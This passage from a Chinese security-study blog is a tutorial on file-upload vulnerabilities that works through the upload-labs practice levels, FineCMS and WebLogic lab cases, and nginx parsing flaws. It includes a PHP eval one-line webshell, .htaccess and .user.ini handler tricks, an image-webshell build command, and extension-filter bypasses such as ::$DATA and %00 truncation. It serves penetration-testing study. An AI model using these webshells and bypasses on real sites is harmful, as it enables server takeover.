<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D.assets/1653818225903.png" alt="1653818225903"></p>
<p>http</p>
<p>ftp</p>
<p>file</p>
<p>各种脚本协议</p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>编程系列[python黑客编程]</title>
    <url>/2022/05/02/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/%E7%BC%96%E7%A8%8B%E7%B3%BB%E5%88%97%5Bpython%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%5D/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>黑客编程</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[文件上传]</title>
    <url>/2022/04/21/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20/</url>
    <content><![CDATA[<h1><span id="文件上传">文件上传</span></h1><p> <img src="/../../images/xdwjsc/1622126816762-c2732d82-af6d-4dd4-a3bb-9d10addbdf80.png" alt="img"> </p>
<h1><span id="一初始文件上传">一，初始文件上传</span></h1><p><strong>什么是文件上传漏洞?</strong></p>
<ul>
<li>指程序对文件的上传未作全面的限制，导致用户可以上传一些超越用户权限的一些文件，可以是木马，shell脚本，病毒等。</li>
</ul>
<p><strong>文件上传漏洞有哪些危害?</strong></p>
<ul>
<li>可以通过文件上传漏洞上传webshell后门。</li>
</ul>
<p><strong>文件上传漏洞如何查找及判断?</strong></p>
<ul>
<li>黑盒：使用扫描工具扫描打开网站。</li>
<li>黑盒：测试会员中心，测试后台。</li>
<li>白盒：直接撸源代码。</li>
</ul>
<p><strong>文件上传漏洞有哪些需要注意的地方?</strong></p>
<ul>
<li>拿到漏洞后要对漏洞<strong>类型</strong>进行区分，编辑器、第三方应用、常规等。</li>
<li>区分漏洞类型</li>
</ul>
<p><strong>关于文件上传漏洞在实际应用中的说明?</strong></p>
<ul>
<li>上传后门脚本获取网站权限。</li>
</ul>
<hr>
<p> <strong>文件上传漏洞有哪些需要注意的地方？</strong></p>
<blockquote>
<p>对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期的测试。</p>
</blockquote>
<p><img src="/../../images/xdwjsc/1622126824257-4360481f-3368-4846-b0db-000bfb9b443e.png" alt="img"></p>
<blockquote>
<p>常规类：扫描获取上传，会员中心上传，后台系统上传，各种途径上传</p>
<p>CMS类：已知CMS源码，搜索已知cms漏洞</p>
<p>编辑器类：ckeditor,fckeditor,kindeditor,xxxeditor，也是搜索相关编辑器漏洞</p>
<p>配合解析漏洞下的文件类型后门：可以通过解析漏洞，上传包含后门代码的图片</p>
</blockquote>
<h1><span id="二文件上传在实际应用中的方式">二，文件上传在实际应用中的方式</span></h1><p> <strong>方法一</strong></p>
<blockquote>
<p>​     先直接传一个PHP，实战先传马。</p>
<p>​    实战先传一个正常的图片，看看有无返回存储地址。</p>
<p>​    如果能直接上传并解析，已离成功不远。</p>
</blockquote>
<p> <strong>方法二</strong></p>
<blockquote>
<p>先传一个shell，然后进行修改。</p>
<p>connect-Type:image&#x2F;jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a</p>
<p>当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。</p>
</blockquote>
<p><strong>方法三</strong></p>
<blockquote>
<ul>
<li>上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。</li>
</ul>
<p>​     黑名单限制一般为此文件类型不允许上传，考虑双写，大小         写，空格，php2,php3,php4,php5,pht</p>
<p>​    phtml,等方式</p>
<ul>
<li>我们继续上传一个&#x2F;htaccess文件</li>
</ul>
</blockquote>
<blockquote>
<p>​    .htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马</p>
<ul>
<li>如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</li>
</ul>
</blockquote>
<p> <strong>方法四</strong></p>
<blockquote>
<p>​    如果白名单限制上传</p>
<ul>
<li>考虑00截断上传</li>
<li>文件包含漏洞+图片马</li>
<li>文件包含漏洞+二次渲染+图片马</li>
</ul>
</blockquote>
<p> <strong>方法五</strong></p>
<blockquote>
<p>​    上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，就得考虑条件竞争。</p>
</blockquote>
<p>​    <strong>以上均不行，考虑逻辑层面的思路。</strong></p>
<hr>
<h3><span id="靶场源码">靶场源码：</span></h3><p><a href="https://github.com/c0ny1/upload-labs">upload-labs</a></p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-install.html">靶场搭建</a></p>
<h1><span id="三常规文件上传地址的获取">三，常规文件上传地址的获取</span></h1><h3><span id="1使用谷歌语法搜索inurluploadphp">1.使用谷歌语法搜索inurl:upload.php</span></h3><p><img src="/../../images/xdwjsc/1629168732384-87fbfad2-4448-4cc9-b115-2369061f5ce8.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629168750363-0866b3fd-cc79-4c87-be44-bb6d1c7d2e9f.png" alt="img"></p>
<p>搜索上传界面</p>
<p><img src="/../../images/xdwjsc/1629168782687-1bfd408e-ff2e-4e44-a056-72a6599af345.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629168820723-6da654cc-ec5e-4bac-b30b-322013ec69c1.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629168848030-c70d865c-b335-4dd9-b89a-4e21396724a6.png" alt="img"></p>
<p>使用工具扫描</p>
<p><img src="/../../images/xdwjsc/1622130185771-2984bedb-5095-4215-81f7-6056372785aa.png" alt="img"></p>
<h3><span id="2-不同格式下的文件类型后门测试">2. 不同格式下的文件类型后门测试</span></h3><p><img src="/../../images/xdwjsc/1629174694388-e7823587-79ab-440a-ade4-bff8a806b643.png" alt="img"></p>
<p>不要妄想通过一个图片你能带着你的后门来控制网站。直接改格式有时候并没有什么用</p>
<p><strong>什么格式代码就用什么格式去执行。</strong></p>
<p><img src="/../../images/xdwjsc/1629174641258-79cf72de-8317-4e69-923b-4bb9636a8511.png" alt="img"></p>
<h3><span id="3-配合解析漏洞下的文件类型后门测试">3. 配合解析漏洞下的文件类型后门测试</span></h3><p>nginx解析漏洞</p>
<p><a href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</a></p>
<p><img src="/../../images/xdwjsc/1622134059414-85bea362-2ecc-4972-9158-b80f6a72d408.png" alt="img"></p>
<p>照片使用编辑器打开，在末尾写入代码，可以多写几遍</p>
<p><img src="/../../images/xdwjsc/1629177844565-228ea7dc-4d30-4e2e-9d4d-4a4576e98eb9.png" alt="img"></p>
<p>然后将照片上传，发现上传成功</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629178139488-d46cc717-ac42-45ea-8d5a-a85ca5c9624a.png" alt="img"></p>
<p>通过路径打开文件，正常显示，所以写入代码失败，正是由于上传的是图片格式而不是PHP代码格式，所以无法执行</p>
<p><img src="/../../images/xdwjsc/1629178185605-f9507ca8-cd6d-4bef-90a6-003a1648dea9.png" alt="img"></p>
<p>在路径后面加上1.php 发现可以执行了，这并不是说这样加了都可以，是因为这里有Ngiinx畸形解析漏洞， 对方在解析上的出现了混乱</p>
<p>解析的规则是要看有没有漏洞，有的话可以按这种方法，没有的话就无法实现 </p>
<p><img src="/../../images/xdwjsc/1629178853599-9108fbb2-1a64-4c06-be4f-491ed05268bc.png" alt="img"></p>
<h3><span id="4-本地文件上传漏洞靶场环境搭建测试">4. 本地文件上传漏洞靶场环境搭建测试</span></h3><p><img src="/../../images/xdwjsc/1629166752352-ce27a81a-6d69-4a64-9558-f2eb184dbfba.png" alt="img"></p>
<p>PHP称为后端语言是因为它的代码和你前端执行源代码是不同的。</p>
<p>前端：代码直接在本地浏览器上执行。(不安全)</p>
<p><img src="/../../images/xdwjsc/1629182307390-4df142d5-e27d-4bbe-9727-0a2c62202ba9.png" alt="img"></p>
<p>后端：发送到对方服务器脚本里面，脚本再去验证去判断。</p>
<p>前端代码过滤，删除这段代码即可</p>
<p><img src="/../../images/xdwjsc/1622137600617-a1e11f61-7b78-4888-8daf-770d0a4647f1.png" alt="img"></p>
<h3><span id="5-某cms及cve编号文件上传漏洞测试">5. 某CMS及CVE编号文件上传漏洞测试</span></h3><p>CMS </p>
<p>存在会员中心，在上传头像界面可能存在文件上传漏洞</p>
<p><img src="/../../images/xdwjsc/1629183140211-9c4072bb-b57f-43ea-bfd8-012ab84087f4.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629183195501-0a384d2e-56f9-42e0-b2ed-23a845449237.png" alt="img"></p>
<p>上传操作是使用JS进行验证，在浏览器前端完成。所以抓不到包</p>
<p><img src="/../../images/xdwjsc/1629183287807-3c92a4c1-7980-4a7d-8a00-60c6ead5d77b.png" alt="img"></p>
<p>点击保存出现了数据包</p>
<p><img src="/../../images/xdwjsc/1629183367027-b09ba000-5168-42cf-a481-2dc23c1a3a4c.png" alt="img"></p>
<p>改成PHP</p>
<p><img src="/../../images/xdwjsc/1629183577417-ccf85756-989c-4cf0-a3d8-1c3843be76f5.png" alt="img"></p>
<p>上传时显示上传失败，显示的是失败，错误提示没有路径的回显</p>
<p><img src="/../../images/xdwjsc/1629183842287-f11751df-23b2-46eb-9a8c-4e1922afab35.png" alt="img"></p>
<p>注意到使用的是FineCMS，所以去搜索一些关于FineCMS的漏洞</p>
<p><img src="/../../images/xdwjsc/1629184262664-3450ea59-f848-4ade-aa6c-4344299dece6.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629184294727-3aa4c2b8-11b2-4829-93dc-9dc4dfe3aae1.png" alt="img"></p>
<p>根据前辈经验进行尝试</p>
<p><img src="/../../images/xdwjsc/1629185584731-3ea3cfec-8920-47d2-887d-9ae131165730.png" alt="img"></p>
<p>UID查找，发现cookies中含有。（也可以爆破）</p>
<p><img src="/../../images/xdwjsc/1629185660350-2907e3f9-0eff-4204-86ed-ad2fa46c9454.png" alt="img"></p>
<p>对后缀进行修改</p>
<p><img src="/../../images/xdwjsc/1629185892129-4f7acd95-2c0c-4427-bad2-fd592fbe2be8.png" alt="img"></p>
<p>修改uid为3</p>
<p><img src="/../../images/xdwjsc/1629185923737-3d8051e9-df77-407a-a77b-16508beb611a.png" alt="img"></p>
<p>上传时可能出现404，再上传一次上传成功</p>
<p><img src="/../../images/xdwjsc/1629186008834-6d52113f-af75-4cac-b950-ed610c565b71.png" alt="img"></p>
<p>执行成功</p>
<p><img src="/../../images/xdwjsc/1629186097055-ddc33f34-75e4-44b3-bfe6-2f2139c292de.png" alt="img"></p>
<p>weblogic任意文件上传漏洞</p>
<p>启动靶场环境，获取账号密码</p>
<p><img src="/../../images/xdwjsc/1629186608304-df88f8f3-79ab-484f-85e3-14d2f24cbcff.png" alt="img"></p>
<p>打开本地IP 7001端口</p>
<p>127.0.0.1:7001&#x2F;console</p>
<p>登录账号密码</p>
<p><img src="/../../images/xdwjsc/1629186702809-6541551f-d90d-46be-86ce-0f5850f1c38b.png" alt="img"></p>
<p>点击base_domin</p>
<p><img src="/../../images/xdwjsc/1629186798883-64f4d8d2-904f-4a28-83d1-c572f5ca97b9.png" alt="img"></p>
<p>点击高级–&gt;勾选”启用web服务测试页”</p>
<p><img src="/../../images/xdwjsc/1629186854350-37bfdc00-4e7b-4c89-8209-efe099bf2ddc.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629186913837-cda9e881-a823-4367-8b9d-0cefe2d3399b.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629186997198-a0a4cca5-8861-48d9-84d9-8cd37f478876.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629187035382-164f1123-678b-418d-b8f7-33b38bb7f47f.png" alt="img"></p>
<p>上传后查看数据包，其中有时间戳</p>
<p><img src="/../../images/xdwjsc/1629187112887-9becb0bf-1fa7-4fe7-916f-d0bc985c4706.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/22078880/1629187133902-0641dc1b-624b-46ba-b574-17d86a809401.png" alt="img"></p>
<p><img src="/../../images/xdwjsc/1629187265574-4324e364-c988-4a35-ab10-139e4bc29232.png" alt="img"></p>
<p>文件上传成功</p>
<p><img src="/../../images/xdwjsc/1629187281486-7d34556c-ad0b-4062-82c6-e935d76f73e6.png" alt="img"></p>
<h1><span id="四黑白名单绕过">四，<strong>黑白名单绕过</strong></span></h1><p><img src="/../../images/xdwjsc/1650526844382.png" alt="1650526844382"></p>
<h2><span id="pass-1-使用js对不合法图片进行检查前端js">Pass-1 (使用js对不合法图片进行检查[前端js])</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[123123])?&gt;<br>&lt;?php<br>phpinfo();<br>?&gt;<br></code></pre></td></tr></table></figure>



<ol>
<li><p>上传webshell提示不允许上传，限制了上传文件的类型</p>
<p><img src="/../../images/xdwjsc/1650527232392.png" alt="1650527232392"></p>
<p>这时要猜测判断文件后缀的代码是在前端还是后端<br>F12看源码</p>
</li>
</ol>
<p><img src="/../../images/xdwjsc/1650527556710.png" alt="1650527556710"></p>
<p>​    发现是js代码判断的</p>
<p><img src="/../../images/xdwjsc/1650527511488.png" alt="1650527511488"></p>
<ul>
<li><p>方法一：删除部分js代码</p>
<p><img src="/../../images/xdwjsc/1650528801745.png" alt="1650528801745"></p>
</li>
<li><p>方法二： firebug修改前端代码，添加允许上传类型.php</p>
</li>
</ul>
<p><img src="/../../images/xdwjsc/1650528844905.png" alt="1650528844905"></p>
<ul>
<li><p>方法三：</p>
<p>利用burp抓包，先把webshell后缀名改成网站允许上传的格式，在绕过前端验证后，在burp中将数据包格式改为小马原有格式</p>
<p><img src="/../../images/xdwjsc/1650528749401.png" alt="1650528749401"></p>
</li>
</ul>
<h2><span id="pass-2-mime类型">Pass-2  (MIME类型)</span></h2><p>跟Pass1 一样限制了文件上传的类型</p>
<p>不是在js中，而是在服务器端进行了限制</p>
<blockquote>
<p><strong>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准</strong><br><strong>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据</strong><br><strong>在HTTP 协议中，使用Content-Type 字段表示文件的MIME 类型</strong></p>
</blockquote>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650529722352.png" alt="1650529722352"></p>
<ul>
<li>源码解析</li>
</ul>
<p><img src="/../../images/xdwjsc/1646821134815.png" alt="1646821134815"></p>
<ul>
<li><strong>验证代码，这种单一的文件验证是不安全的，上传时只需要修改对应的文件后缀名就可以</strong></li>
</ul>
<p><img src="/../../images/xdwjsc/1646822162417.png" alt="1646822162417"></p>
<ul>
<li>上传成功</li>
</ul>
<p><img src="/../../images/xdwjsc/1650529588209.png" alt="1650529588209"></p>
<h2><span id="pass-3黑名单验证后缀名">Pass-3（黑名单验证[后缀名]）</span></h2><p>直接告诉我们不允许上传的文件后缀名</p>
<p><img src="/../../images/xdwjsc/165053014478761.png" alt="1650530178761"></p>
<p><strong>strrchr</strong></p>
<p><img src="/../../images/xdwjsc/16468326879401.png" alt="1646832687901"></p>
<p><img src="/../../images/xdwjsc/164683276844387.png" alt="1646832768387"></p>
<ul>
<li><strong>上传代码解析</strong></li>
<li><strong>防止有些方法进行绕过</strong></li>
</ul>
<p><img src="/../../images/xdwjsc/164683310448347.png" alt="1646833108347"></p>
<ul>
<li><p><strong>上传PHP其他格式，如PHP5，PHP4，PHTML，上传成功</strong></p>
<p>不过上传成功也是要有一些条件，需要Apache  httpd.conf配置文件，添加php5…添加此条件（默认开启）</p>
<p><img src="/../../images/xdwjsc/1646833879697.png" alt="1646833879697"></p>
</li>
</ul>
<p><img src="/../../images/xdwjsc/1646833754131.png" alt="1646833754131"></p>
<h2><span id="pass-4htaccess解析">Pass-4（.htaccess解析）</span></h2><p>必Pass3还严格</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650531887905.png" alt="1650531887905"></p>
<ul>
<li>绕过方法</li>
</ul>
<blockquote>
<p> <strong>仅存在于Apache中</strong></p>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>通过htaccess来实现上传文件后缀自定义</p>
</blockquote>
<p>创建htaccess文件</p>
<p> <strong>这样所有文件都会当成php来解析</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;FilesMatch &quot;shana&quot;&gt;<br>Sethandler application/x-httpd-php<br>&lt;/FilesMatch &gt;<br></code></pre></td></tr></table></figure>

<p>先上传.htaccess文件，上传成功</p>
<p><img src="/../../images/xdwjsc/1629275392238-76cbaf3c-3f48-467f-8a0d-1f07c21aa50a.png" alt="img"></p>
<p>下载一张后缀名为jpg的图片，把图片名改为shana，即shana.jpg。打开图片，在最后增加一行php代码，然后上传</p>
<p><strong>当然，直接把php小马后缀名改成jpg也可以上传</strong></p>
<p><img src="/../../images/xdwjsc/1629275575960-dfc154fa-64b6-4886-b48b-81b5d885be4a.png" alt="img"></p>
<p>图片中包含的代码显示成功</p>
<p><img src="/../../images/xdwjsc/1629275601034-1d97ad81-1ecc-4eed-bf63-cd007330d2f8.png" alt="img"></p>
<h2><span id="pass-5-大小写绕过黑名单">Pass-5  (大小写绕过黑名单)</span></h2><p><strong>把 .htaccess后缀的给过滤掉了</strong></p>
<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E5%2590%258E%25E7%25AB%25AF%25E9%25BB%2591%25E5%2590%258D%25E5%258D%2595%25E7%25BB%2595%25E8%25BF%2587.assets/1646887836364.png" alt="1646887836364"></p>
<p><img src="/../../images/xdwjsc/1646888081753.png" alt="1646888081753"></p>
<p><strong>方法一：只需要把文件后缀名改成大写的就能过</strong></p>
<p><img src="/../../images/xdwjsc/1646888269489.png" alt="1646888269489"></p>
<p>方法二： <code>.htaccess</code> 被禁用了</p>
<p>但是.ini没禁用</p>
<p>所以可以上传<code>.user.ini</code>文件<br>内容是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">auto_prepend_file=test.jpg<br></code></pre></td></tr></table></figure>

<p>让所有php文件都“自动”包含<code>test.jpg</code>文件</p>
<h2><span id="pass-6-空格绕过黑名单">Pass-6 (空格绕过黑名单)</span></h2><p><strong>源码分析：</strong>没有发现使用trim()函数</p>
<p><strong>trim()：去除字符串中的空格</strong></p>
<p><img src="/../../images/xdwjsc/1650545901481.png" alt="1650545901481"></p>
<p><strong>原理解析</strong>：在<strong>数据包中加空格是会被接受的</strong>，也就是说，在抓包时，<strong>文件名.php</strong>，我们只需要在写成<strong>php空格</strong>就可以完成绕过操作，但是在<strong>Windows中系统会强制删除后缀名的空格</strong></p>
<p><img src="/../../images/xdwjsc/1650546189170.png" alt="1650546189170"></p>
<h2><span id="pass7点绕过">Pass7（点绕过）</span></h2><p><strong>代码解析：没有对小数点进行过滤</strong></p>
<p><img src="/../../images/xdwjsc/1646889625436.png" alt="1646889625436"></p>
<p><strong>1.txt 和 1.txt.  两者是一个文件，是一样的， . 和空格是一码事</strong></p>
<p><img src="/../../images/xdwjsc/1646889560214.png" alt="1646889560214"></p>
<p><strong>上传成功</strong></p>
<p><img src="/../../images/xdwjsc/1650546325341.png" alt="1650546325341"></p>
<h2><span id="pass8data绕过">Pass8（::$DATA绕过）</span></h2><p>利用Windows特性</p>
<p><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong></p>
<p><strong>例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</strong></p>
<p>查看源码分析，发现少了::$DATA验证</p>
<p><img src="/../../images/xdwjsc/1646889936059.png" alt="1646889936059"></p>
<p><strong>抓包 后缀名加::$DATA即可绕过</strong></p>
<p><img src="/../../images/xdwjsc/1646890024376.png" alt="1646890024376"></p>
<p>上传成功</p>
<p><img src="/../../images/xdwjsc/16468900138570.png" alt="1646890038570"></p>
<h2><span id="pass9-点空格绕过">Pass9 （点空格绕过）</span></h2><p>代码将字符串里的php替换为空 </p>
<p>一次过滤</p>
<p>a.php -&gt; a.</p>
<p>a.pphphp -&gt; a.php   将中间的php过滤掉，还有个php</p>
<p>循环过滤 递归过滤</p>
<p>a.pphphp -&gt; a.    只要有php出现就会一直过滤掉</p>
<p><strong>代码分析：源码中的过滤都是过滤一次，那么多写几个点和空格让他过滤，是不是就完成绕过了呢</strong></p>
<p><img src="/../../images/xdwjsc/1646890915214.png" alt="1646890915214"></p>
<p><img src="/../../images/xdwjsc/1646890811239.png" alt="1646890811239"></p>
<ol>
<li><strong>修改数据为 xxx.php. .(点 空格 点)，上传成功</strong></li>
</ol>
<p><img src="/../../images/xdwjsc/1646890962212.png" alt="1646890962212"></p>
<h2><span id="pass10-双后缀名绕过">Pass10 （双后缀名绕过）</span></h2><p>代码分析：将黑名单的后缀名替换为空，但是它也是单次过滤，没有循环过滤，我们只需要把php改成pphp</p>
<p><img src="/../../images/xdwjsc/1646926751786.png" alt="1646926751786"></p>
<ol>
<li><p>正常上传后缀名被过滤掉了<img src="/../../images/xdwjsc/1646926601315.png" alt="1646926601315"></p>
</li>
<li><p>改后缀名，上传成功</p>
<p><img src="/../../images/xdwjsc/1650547805604.png" alt="1650547805604"></p>
</li>
</ol>
<p>3.当然，改其他格式也是可以的，例如，js，asp…</p>
<p><img src="/../../images/xdwjsc/1646927294393.png" alt="1646927294393"></p>
<h2><span id="pass1100截断get">Pass11（%00截断—GET）</span></h2><p><strong>%00截断原理</strong></p>
<p><strong><a href="http://www.xxx.com/1.jpg">www.xxx.com/1.jpg</a></strong></p>
<p><strong><a href="http://www.xxx.com/webshell.php%00.jpg">www.xxx.com/webshell.php%00.jpg</a> &#x3D;&gt; <a href="http://www.xxx.com/1.php">www.xxx.com/1.php</a></strong></p>
<p><strong>%00是被服务器解码为0x00发挥了截断作用</strong></p>
<p><strong>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</strong></p>
<p><strong>%00和0x00是有区别的：%00是URL中的，0x00是文件命名</strong></p>
<p><strong>%00需要PHP版本小于5.3.4，且打开php的配置文件php-ini，</strong></p>
<p><strong>将magic_quotes_gpc设置为Off</strong></p>
<p><strong>代码分析：</strong></p>
<p>都是指定能上传的文件后缀名</p>
<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E5%2590%258E%25E7%25AB%25AF%25E9%25BB%2591%25E5%2590%258D%25E5%258D%2595%25E7%25BB%2595%25E8%25BF%2587.assets/1646932802901.png" alt="1646932802901"></p>
<p><img src="/../../images/xdwjsc/1650598789303.png" alt="1650598789303"></p>
<h2><span id="pass1100截断post">Pass11（%00截断—POST）</span></h2><p>与上一题相比<br>区别是上传方式变成了POST</p>
<p>还是利用00截断<br>但是POST不会像GET对%00进行自动解码<br>需要在十六进制中进行修改</p>
<p><img src="/../../images/xdwjsc/1650627059910.png" alt="1650627059910"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650627101471.png" alt="1650627101471"></p>
<p><img src="/../../images/xdwjsc/1650627388254.png" alt="1650627388254"></p>
<p><strong>成功上传phpinfo</strong></p>
<p><img src="/../../images/xdwjsc/1650627414761.png" alt="1650627414761"></p>
<h1><span id="五-文件上传之内容逻辑数组绕过">五. 文件上传之内容逻辑数组绕过</span></h1><p> <strong>在学习完代码层面中会指定禁止上传得脚本文件，限制文件后缀和基本的绕过黑名单方法，那么如果服务器指定只能上传的文件呢？那么我们就要通过某些漏洞来突破这些限制，从而获取webshell</strong></p>
<h4><span id="1-图片一句话制作方法">1. 图片一句话制作方法：</span></h4><ol>
<li><strong>将shell.php和1.png类容合在一起</strong></li>
</ol>
<p>copy 1.png &#x2F;b + shell.php &#x2F;a webshell.jpg</p>
<p>&#x2F;b：指定以二进制以二进制格式复制，合并文件，用于图像或者声音类文件</p>
<p>&#x2F;a：指定以ascii格式复制，合并文件，用于txt等文本类文件</p>
<p><img src="/../../images/xdwjsc/164705372385h1.png" alt="1647053723851"></p>
<ol start="2">
<li><strong>生成图片马</strong></li>
</ol>
<p><img src="/../../images/xdwjsc/1647053782801.png" alt="1647053782801"></p>
<ol start="3">
<li><p><strong>图片马代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php  @ eval($_POST[&#x27;x&#x27;]) ; ?&gt;<br>or<br>&lt;?php phpinfo() ?&gt;<br></code></pre></td></tr></table></figure></li>
</ol>
<h4><span id="2-文件头检测">2. 文件头检测</span></h4><p>文件头检查是指当浏览器上传到服务器的时候，白名单进行的文件头检测，符合，则允许上传，否则不允许上传</p>
<h4><span id="3-文件包含漏洞解析"><strong>3. 文件包含漏洞解析</strong></span></h4><blockquote>
<p><strong>什么是文件包含</strong>：</p>
<pre><code>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。 
</code></pre>
</blockquote>
<p>通过get方式把想要包含的文件传递给服务器，当服务器接收到包含的文件时，找到图片地址，运行包含include得脚本，引入图片马，即可出发文件包含漏洞</p>
<p>在PHP中，只要使用include包含的文件，文件只要有php代码， 不管是jpg，png格式，都会按照    php来执行</p>
<p><strong>说白了存在包含漏洞，利用此漏洞可以将存有php代码的jpg图片以php执行</strong></p>
<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E4%25B9%258B%25E5%2586%2585%25E5%25AE%25B9%25E9%2580%25BB%25E8%25BE%2591%25E6%2595%25B0%25E7%25BB%2584%25E7%25BB%2595%25E8%25BF%2587.assets/1647062488328.png" alt="1647062488328"></p>
<h2><span id="pass-13文件头检测图片马利用文件包含漏洞"><strong>Pass-13（文件头检测，图片马利用文件包含漏洞）</strong></span></h2><p>分析代码：代码中存在验证头信息</p>
<p><img src="/../../images/xdwjsc/1647065017758.png" alt="1647065017758"></p>
<p>例如GIF：GIF89a就是GIF的文件头</p>
<p><img src="/../../images/xdwjsc/1647065056247.png" alt="1647065056247"></p>
<ol>
<li>制作图片马</li>
</ol>
<p><img src="/../../images/xdwjsc/1647064202224.png" alt="1647064202224"></p>
<ol start="2">
<li>上传图片马，复制地址</li>
</ol>
<p><img src="/../../images/xdwjsc/1647064368005.png" alt="1647064368005"></p>
<ol start="3">
<li>利用文件包含漏洞，执行图片马中的代码</li>
</ol>
<p><img src="/../../images/xdwjsc/1647064624320.png" alt="1647064624320"></p>
<p><strong>方法二：直接修改脚本后缀名，和文件头</strong></p>
<p><img src="/../../images/xdwjsc/1650630521824.png" alt="1650630521824"></p>
<h2><span id="pass-14-突破getimagesize">Pass-14 （突破getimagesize）</span></h2><p>php  getimagesize()函数：用于获取图像大小及相关信息，只接收图像相当于限制了文件类型，在排除解析漏洞，只能上传图像</p>
<p><img src="/../../images/xdwjsc/1647065297756.png" alt="1647065297756"></p>
<p>利用文件包含漏洞还是可以执行成功图片马</p>
<p><strong>与Pass13类似，此关主要学习了getimagesize作用</strong></p>
<p><img src="/../../images/xdwjsc/1647065509306.png" alt="1647065509306"></p>
<h2><span id="pass-15突破exif-imagetype">Pass-15（突破exif-imagetype）</span></h2><p><strong>分析源码</strong></p>
<p><strong>exif-imagetype：获取图片类型，验证上传图片的真实格式。只接收图像相当于限制了文件类型</strong></p>
<p><img src="/../../images/xdwjsc/1647065688699.png" alt="1647065688699"></p>
<p>利用文件包含漏洞还是可以执行成功图片马</p>
<p><strong>与Pass13类似，此关主要学习了exif-imagetype作用</strong></p>
<p><img src="/../../images/xdwjsc/16470654946897.png" alt="1647065946897"></p>
<p><strong>小结：Pass14&#x2F;15&#x2F;16利用了getimagesize&#x2F;exif-imagetype函数来验证上传的图像信息来判断是不是图像，如果没有文件包含漏洞，那么还是比较安全的</strong></p>
<h2><span id="pass-16-二次渲染绕过">Pass-16 （二次渲染绕过）</span></h2><h4><span id="1-gif绕过">1. GIF绕过</span></h4><p><img src="/../../images/xdwjsc/1650685845267.png" alt="1650685845267"></p>
<ul>
<li>判断了后缀名、content-type</li>
<li>利用imagecreatefromgif判断格式</li>
<li>二次渲染了上传的图片</li>
</ul>
<blockquote>
